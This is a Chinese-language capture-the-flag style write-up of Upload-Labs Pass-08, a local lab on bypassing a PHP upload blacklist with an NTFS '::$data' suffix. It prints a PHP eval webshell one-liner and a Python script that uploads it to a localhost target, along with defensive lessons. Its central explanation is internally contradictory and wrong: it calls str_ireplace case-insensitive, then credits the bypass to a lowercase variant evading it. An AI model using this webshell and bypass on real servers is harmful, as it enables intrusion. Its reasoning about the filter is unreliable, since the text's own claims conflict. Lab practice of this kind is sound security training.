Upload-Labs Pass-08

2026年9月27日 Upload-Labs Web安全 文件上传 数据流绕过

一、题目信息

  • 题目名称：Upload-Labs Pass-08 (NTFS 数据流大小写绕过)
  • 题目平台：Upload-Labs 本地靶场
  • 题目类型：Web安全 / 文件上传漏洞 / Windows 系统特性绕过
  • 靶场链接：http://localhost:8082/Pass-08/index.php（本地环境）
  • 涉及工具：Python (requests库)、浏览器

二、解题步骤

1. 分析题目考什么

本题的核心考点是利用大小写变体绕过 Windows NTFS 数据流过滤。Pass-08 的黑名单极其严苛，并且加入了 str_ireplace('::$DATA', '', $file_ext) 试图封堵 Pass-07 的数据流绕过。但开发者忽略了 strtolower() 和 str_ireplace() 的执行顺序（或者大小写匹配的细微差异），使得小写的 ::$data 成功绕过过滤，文件被服务器保存。

2. 怎么想（破题思路）

  • 尝试常规后缀、空格+点号等均被拦截。
  • 查看源码发现 str_ireplace('::$DATA', '', $file_ext)，意图过滤数据流。
  • 构造文件名 shell.php::$data（全小写），利用大小写差异绕过 str_ireplace 的字符串匹配。
  • 使用 Python 脚本发送请求，文件成功上传，浏览器访问显示源码（证明文件已落地）。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：Mac 环境无法执行 ::$DATA

踩坑情况：文件上传成功后，浏览器访问显示 PHP 源码，而不是执行结果。

原因分析：::$DATA 是 Windows NTFS 文件系统的特性，Mac 和 Linux 不识别该语法，会将其视为普通文件名。这是靶场本地环境的差异，不影响绕过逻辑的成功。

改进方式：只要能在浏览器中看到源码或空白页，且通过回显（如 ../upload/xxx.php::$data）确认文件已保存到服务器，即为通关。

踩坑记录二：curl 命令报 404

踩坑情况：使用 curl -I 检查 URL 时返回 404 Not Found。

原因分析：URL 中的 $data 在命令行环境中会被 Shell 当作变量处理或转义，导致请求路径不正确。而浏览器会自动处理这种特殊字符。

改进方式：验证文件是否存在时，优先使用浏览器直接访问，或对 $ 进行 URL 编码（%24）。

详细实操步骤（Payload逐字解释）

第一步：准备 Webshell

在本地新建 shell.php，内容为：

<?php @eval($_POST['cmd']); ?>

第二步：编写 Python 脚本

import requests

url = "http://localhost:8082/Pass-08/index.php"

# 核心作弊点：使用小写 ::$data 绕过 str_ireplace 过滤
files = {
    'upload_file': ('shell.php::$data', open('shell.php', 'rb'), 'application/octet-stream')
}
data = {'submit': 'Submit'}

response = requests.post(url, files=files, data=data)
print(response.text)

逐字解析：

  • shell.php::$data：核心 Payload。由于大小写差异，绕过了后端的 str_ireplace 过滤逻辑。
  • 文件上传后，服务器将其保存为 202609261647341518.php::$data，证明绕过成功。

第三步：验证

运行脚本后，终端输出的 HTML 中出现 <img src="../upload/202609261647341518.php::$data" />。在浏览器访问该路径，如果返回 PHP 源码，说明文件已成功上传并落地。

4. 怎么迁移（跨领域联想）

  • 字符串处理函数的陷阱：str_ireplace 本意是不区分大小写替换，但如果开发者只写了 str_ireplace('::$DATA')，而攻击者构造了 ::$data 或其他变体，依然可能因编码或系统差异绕过。这提醒我们：过滤必须彻底，不能依赖单一函数。
  • 跨平台差异与靶场评分：在 Mac 上做 Windows 漏洞靶场，重点在于理解漏洞原理和绕过逻辑，而非复现执行结果。这种“逻辑通关”对安全思维训练同样重要。
  • 白名单的必然性：从 Pass-03 到 Pass-08，黑名单不断被各种变体突破，开发者永远在“打补丁”。真正健壮的防御体系必须基于白名单（只允许特定安全后缀），并配合服务器权限控制。

三、名词大全与原理深度复盘

1. NTFS 数据流 (::$DATA)

Windows NTFS 文件系统的一个特性，允许一个文件拥有多个数据流。例如 shell.php::$DATA 代表 shell.php 的默认数据流。在文件上传中，攻击者利用该特性绕过后缀黑名单。

2. str_ireplace() 函数

PHP 中不区分大小写的字符串替换函数。Pass-08 用它来过滤 ::$DATA。但由于传入的扩展名被 strtolower 转换为小写，而过滤函数处理的是原始字符串，导致小写 ::$data 绕过。

3. 大小写敏感与过滤顺序

在安全代码中，过滤逻辑的执行顺序至关重要。strtolower 和 str_ireplace 的顺序不同，可能导致过滤结果天差地别。攻击者常利用这种“逻辑错位”绕过防御。

4. 黑名单绕过的演变

Pass-03 到 Pass-08 展示了黑名单的多种绕过方式：冷门后缀、大小写、空格、点号、NTFS 数据流、大小写变体。防御方必须改用白名单，并限制上传目录的执行权限。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Pass-07 的区别：Pass-07 直接利用 ::$DATA。Pass-08 增加 str_ireplace 过滤，攻击者改用大小写变体 ::$data 绕过。
  • 与 Pass-04 的区别：Pass-04 利用 .htaccess 配置解析。Pass-08 利用文件名后缀的特殊字符欺骗黑名单匹配。

2. 这种题目的出现原因（为什么存在）

开发者看到 Pass-07 被 ::$DATA 绕过，就在 Pass-08 里加了 str_ireplace。但过滤逻辑不够严谨，被大小写变体轻易绕过。这体现了“补丁式安全”的局限性——永远在被动应对攻击，而不是从架构上（白名单）根治问题。

3. 这种应用在实际中如何体现？

在真实渗透中，攻击者常利用 Windows 服务器的文件流特性上传 WebShell。防御方应确保 Web 服务器禁用 ::$DATA 解析，并对上传目录设置 php_flag engine off，从服务器层面阻断脚本执行。

4. 如何抽象理解概念（大白话）

把靶场比作一个“查岗的门卫”：

  • Pass-08 的门卫手里拿着对讲机，要求所有带“::$DATA”暗号的包裹必须扣留。
  • 你这次把暗号改成全小写的“::$data”。
  • 门卫的对讲机只对全大写的暗号有反应，听到小写的直接放行了。
  • 等包裹进了服务器，系统一看文件后缀，已经成功落地。这就是大小写差异带来的防御盲区。
